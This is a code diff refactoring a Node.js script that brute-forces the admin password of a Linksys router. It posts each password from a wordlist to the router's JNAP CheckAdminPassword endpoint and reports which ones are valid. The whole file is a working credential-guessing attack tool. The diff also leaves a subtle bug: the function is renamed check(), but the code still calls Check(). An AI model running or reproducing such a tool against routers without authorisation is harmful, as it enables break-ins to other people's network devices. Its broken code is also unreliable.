@@ -1,61 +1,42 @@
+"use strict";
+
 //Dependencies
-const Base_64 = require("base-64")
-const Request = require("request")
-const Fs = require("fs")
+const request = require("request-async")
+const fs = require("fs")
 
 //Variables
-const Self_Args = process.argv.slice(2)
+const args = process.argv.slice(2)
 
 //Main
-if(!Self_Args.length){
-    return console.log("node index.js <url> <username> <dictionary>")
-}
+if(!args.length) return console.log("node index.js <url> <username> <dictionary>")
 
-if(!Self_Args[0] || Self_Args[0].indexOf("http") === -1){
-    return console.log("Invalid url.")
-}
+if(!args[1]) return console.log("Invalid username.")
+if(!args[2]) return console.log("Invalid dictionary.")
+if(!fs.existsSync(args[2])) return console.log("Invalid dictionary.")
 
-if(!Self_Args[1]){
-    return console.log("Invalid username.")
-}
+const dictionaryData = fs.readFileSync(args[2], "utf8").split("\n")
 
-if(!Self_Args[2]){
-    return console.log("Invalid dictionary.")
-}
+if(!dictionaryData) return console.log("Dictionary data is empty.")
 
-if(!Fs.existsSync(Self_Args[2])){
-    return console.log("Invalid dictionary.")
-}
+var dictionaryIndex = 0
 
-const dictionary_data = Fs.readFileSync(Self_Args[2], "utf8").split("\n")
+check()
+async function check(){
+    if(dictionaryIndex == dictionaryData.length) return console.log("Finished checking.")
 
-if(!dictionary_data){
-    return console.log("Dictionary data is empty.")
-}
-
-var dictionary_index = 0
-
-Check()
-async function Check(){
-    if(dictionary_index == dictionary_data.length){
-        return console.log("Finished checking.")
-    }
-
-    Request.post(`${Self_Args[0]}/JNAP/`, {
+    var response = await request.post(`${args[0]}/JNAP/`, {
         headers: {
             "Content-Type": "application/json; charset=UTF-8",
             "X-JNAP-Action": "http://linksys.com/jnap/core/CheckAdminPassword",
-            "X-JNAP-Authorization": `Basic ${Base_64.encode(`${Self_Args[1]}:${dictionary_data[dictionary_index]}`)}`
+            "X-JNAP-Authorization": `Basic ${Buffer.from(`${args[1]}:${dictionaryData[dictionaryIndex]}`).toString("base64")}`
         },
         body: "{}"
-    }, function(err, res, body){
-        if(body.indexOf("Invalid authorization") === -1){
-            console.log(`Valid password ${dictionary_data[dictionary_index]}`)
-        }else{
-            console.log(`Invalid password ${dictionary_data[dictionary_index]}`)
-        }
-
-        dictionary_index += 1
-        Check()
     })
+    
+    response = response.body
+
+    response.indexOf("Invalid authorization") === -1 ? console.log(`Valid password ${dictionaryData[dictionaryIndex]}`) : console.log(`Invalid password ${dictionaryData[dictionaryIndex]}`)
+
+    dictionaryIndex++
+    Check()
 }
